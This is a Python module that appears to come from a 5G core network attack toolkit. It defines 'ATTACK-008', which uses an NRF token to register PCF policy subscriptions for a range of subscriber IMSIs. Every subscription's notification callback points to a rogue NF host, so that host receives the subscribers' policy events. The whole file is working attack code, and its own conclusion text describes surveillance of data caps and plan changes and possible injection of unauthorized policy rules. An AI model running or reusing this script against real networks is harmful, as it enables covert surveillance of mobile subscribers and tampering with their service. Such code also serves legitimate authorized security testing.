from attacks.base_attack import BaseAttack, AttackResult
from core import http_client, token_manager
from config import PCF_URL, MCC, MNC, SUPI_START, SUPI_END, ROGUE_NF_IP

class PCFPolicyAbuseAttack(BaseAttack):
    attack_id = "ATTACK-008"
    name = "PCF Policy Abuse — Rogue Consumer Registration"
    affected_nf = "PCF"
    endpoint = "POST /npcf-am-policy-control/v1/policies"

    def run(self) -> AttackResult:
        token = token_manager.get_token("PCF", "npcf-am-policy-control")

        if not token:
            return self.result(
                success=False,
                data={},
                evidence="Could not obtain token from NRF",
                conclusion="Token request failed — run ATTACK-002 first."
            )

        registered = {}
        failed = []

        for i in range(SUPI_START, SUPI_END + 1):
            supi = f"imsi-{MCC}{MNC}{str(i).zfill(10)}"
            url = f"{PCF_URL}/npcf-am-policy-control/v1/policies"
            body = {
                "notificationUri": f"http://{ROGUE_NF_IP}:8000/callback",
                "supi": supi,
                "pei": "imeisv-1110000000000000",
                "ipv4Address": "10.60.0.1"
            }

            try:
                resp = http_client.post(url, token=token, json=body)

                if resp.status_code in [200, 201]:
                    registered[supi] = resp.json()
                elif resp.status_code == 403:
                    return self.result(
                        success=False,
                        data={},
                        evidence=f"PCF returned 403 on {supi}",
                        conclusion="PCF enforces per-subscriber authorization — attack blocked."
                    )
                else:
                    failed.append(supi)
            except Exception as e:
                failed.append(supi)

        if registered:
            return self.result(
                success=True,
                data={
                    "registered_count": len(registered),
                    "failed_count": len(failed),
                    "policy_contexts": registered
                },
                evidence=f"Registered as policy consumer for {len(registered)} subscribers. "
                         f"Notification URI set to rogue NF at {ROGUE_NF_IP}:8000.",
                conclusion=f"Rogue NF will now receive real-time policy notifications "
                           f"for {len(registered)} subscribers. "
                           f"Enables surveillance of data cap events, throttling triggers, "
                           f"and plan changes. Can be extended to push unauthorized policy rules."
            )
        else:
            return self.result(
                success=False,
                data={"failed": failed},
                evidence="No policy contexts created in tested SUPI range",
                conclusion="No subscribers found — add subscribers and retry."
            )